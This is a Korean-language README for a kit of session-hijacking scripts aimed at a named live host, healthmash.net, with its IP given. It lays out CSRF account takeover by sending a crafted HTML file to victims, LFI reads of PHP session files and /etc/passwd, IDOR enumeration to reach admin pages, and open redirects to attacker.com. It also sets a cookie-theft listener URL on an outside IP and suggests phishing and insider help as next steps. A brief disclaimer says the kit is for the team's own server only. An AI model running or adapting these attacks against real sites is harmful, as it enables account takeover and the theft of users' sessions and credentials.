# Alternative Session Hijacking Attacks
**XSS/SQLi가 막혔을 때 쿠키/세션 탈취하는 방법들**

Target: **http://healthmash.net (54.180.32.176)**

---

## 📋 공격 방법 요약

| 공격 기법 | 설명 | 성공률 | 스크립트 |
|---------|------|--------|---------|
| **CSRF** | 피해자 이메일 변경 → 계정 탈취 | ⭐⭐⭐⭐⭐ | `csrf_exploit.py` |
| **LFI** | PHP 세션 파일 읽기 | ⭐⭐⭐⭐ | `lfi_scanner.py` |
| **IDOR** | 다른 사용자 데이터 직접 접근 | ⭐⭐⭐⭐ | `idor_scanner.py` |
| **Open Redirect** | 리다이렉트로 credential 탈취 | ⭐⭐⭐ | `redirect_scanner.py` |

---

## 🚀 빠른 시작

### 방법 1: 모든 공격 한번에 실행
```bash
python3 ALL_ATTACKS.py
```

### 방법 2: 개별 공격 실행

#### 1. CSRF Attack (계정 탈취)
```bash
python3 csrf_exploit.py
```

**동작 방식:**
- 피해자의 이메일을 공격자 이메일로 변경
- 비밀번호 재설정으로 계정 탈취
- **XSS 없이 계정 완전 장악 가능!**

#### 2. LFI/Path Traversal (세션 파일 읽기)
```bash
python3 lfi_scanner.py
```

**동작 방식:**
- `/var/lib/php/sessions/sess_*` 파일 읽기 시도
- PHP 세션 파일에서 사용자 데이터 추출
- 세션 ID로 다른 사용자 impersonate

#### 3. IDOR (직접 객체 참조)
```bash
python3 idor_scanner.py
```

**동작 방식:**
- `profile.php?user_id=1,2,3...` 열거
- 다른 사용자의 프로필/세션 데이터 접근
- 관리자 페이지 무단 접근

#### 4. Open Redirect
```bash
python3 redirect_scanner.py
```

**동작 방식:**
- `login.php?redirect=http://attacker.com` 테스트
- 피해자를 공격자 서버로 리다이렉트
- Referer 헤더에서 세션 정보 획득

---

## 🎯 어떤 공격이 가장 효과적인가?

### 1순위: CSRF (Cross-Site Request Forgery)
- ✅ 가장 구현하기 쉬움
- ✅ XSS/SQLi 필터 완전 우회
- ✅ 피해자만 링크 클릭하면 계정 탈취
- ✅ CSRF 토큰 없으면 거의 100% 성공

**실행:**
```bash
python3 csrf_exploit.py
```

**성공 시:**
- `csrf_attack.html` 파일 생성됨
- 이 파일을 피해자에게 전송
- 피해자가 클릭하면 이메일 변경됨
- 비밀번호 재설정으로 계정 탈취!

---

### 2순위: IDOR
- ✅ 인증만 우회하면 모든 데이터 접근
- ✅ 관리자 페이지도 접근 가능
- ✅ 세션 테이블 직접 조회 가능성

**실행:**
```bash
python3 idor_scanner.py
```

---

### 3순위: LFI
- ✅ PHP 세션 파일 직접 읽기
- ✅ 소스 코드 유출 가능
- ⚠️ 경로 찾기가 어려울 수 있음

**실행:**
```bash
python3 lfi_scanner.py
```

---

## 📊 결과 해석

### ✓ 성공 표시
```
✓ CSRF 취약! 토큰 없이 업데이트 성공!
✓ LFI 성공! /etc/passwd 읽기 성공
✓ IDOR 성공! User 2의 프로필 접근
✓ Open Redirect 발견!
```

### ✗ 실패 표시
```
✗ CSRF 보호되어 있음
✗ LFI 차단됨
✗ 403 Forbidden
```

---

## 🔧 커스터마이징

### Target 변경
각 스크립트에서 `TARGET` 변수 수정:
```python
TARGET = "http://healthmash.net"
```

### Attacker Email 변경 (CSRF)
```python
ATTACKER_EMAIL = "your@email.com"
```

### Cookie Listener 변경
```python
LISTENER_URL = "http://3.113.201.239:9999/steal"
```

---

## 🎓 공격 시나리오

### 시나리오 1: CSRF로 계정 탈취
1. `python3 csrf_exploit.py` 실행
2. `csrf_attack.html` 생성 확인
3. 피해자에게 링크 전송 (SNS, 이메일 등)
4. 피해자가 클릭하면 이메일 변경됨
5. 비밀번호 재설정으로 로그인
6. ✅ **계정 완전 장악!**

### 시나리오 2: IDOR로 관리자 접근
1. `python3 idor_scanner.py` 실행
2. 관리자 페이지 URL 발견
3. alice 계정으로 관리자 페이지 접근
4. 모든 사용자 세션 정보 확인
5. ✅ **전체 시스템 장악!**

### 시나리오 3: LFI로 세션 파일 읽기
1. `python3 lfi_scanner.py` 실행
2. `/var/lib/php/sessions/sess_*` 읽기 성공
3. 세션 데이터에서 PHPSESSID 추출
4. 다른 사용자의 세션 ID로 접속
5. ✅ **세션 하이재킹 성공!**

---

## ⚠️ 주의사항

- 이 도구들은 **팀 소유 서버 테스트 목적**으로만 사용
- 무단 접근은 불법
- 실제 공격 전에 팀원들과 협의
- 테스트 후 변경사항은 원래대로 복구

---

## 📞 다음 단계

모든 공격이 실패하면:
1. 네트워크 스니핑 (HTTP인 경우)
2. 물리적 접근 (서버 직접 접근)
3. Social Engineering (피싱)
4. 내부자 공격 (팀원 협조)

---

## 🎉 성공 사례

각 공격이 성공하면:
- **CSRF**: `csrf_attack.html` 파일 생성
- **IDOR**: 다른 사용자 데이터 출력
- **LFI**: `/etc/passwd` 또는 PHP 소스 코드 출력
- **Open Redirect**: 리다이렉트 URL 출력
